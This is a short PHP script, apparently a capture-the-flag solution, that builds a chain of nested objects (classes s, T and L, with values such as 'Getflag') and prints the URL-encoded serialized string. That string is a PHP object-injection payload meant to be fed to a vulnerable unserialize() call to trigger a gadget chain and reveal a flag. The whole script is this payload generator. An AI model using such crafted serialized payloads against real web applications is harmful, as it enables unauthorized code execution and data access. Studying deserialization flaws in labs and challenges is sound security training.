<?php
class s{
    public $f;
    public function __construct(){
        $this->f=new T;
    }
}
class T{
    public $f;
    public $s;
    public function __construct(){
        $this->f=new L;
        $this->s="Getflag";
    }
}
class L{
    private $haha;
    public function __construct(){
        $this->haha="mama";
    }
}
$a=new s;
echo(urlencode(serialize($a)));
